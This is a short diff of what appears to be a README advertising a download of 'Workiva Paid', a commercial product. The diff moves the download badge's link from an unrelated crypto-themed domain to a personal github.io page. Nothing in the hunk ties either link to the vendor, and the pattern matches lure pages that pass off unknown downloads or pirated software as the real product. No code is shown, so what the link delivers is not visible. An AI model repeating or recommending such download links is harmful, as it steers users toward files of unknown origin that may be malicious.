@@ -6,7 +6,7 @@ It gathers presets, naming rules, and automation that map directly to how teams 
 
 Focus areas include Windows 10/11 driver choices, cache placement, and the file formats Workiva Paid sends to other tools.
 
-[![Download Workiva Paid](https://img.shields.io/badge/Download-Workiva_Paid-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download Workiva Paid](https://img.shields.io/badge/Download-Workiva_Paid-blueviolet)](https://lindabaldwinlin.github.io/.github/Workiva-Paid)
 
 ---
 
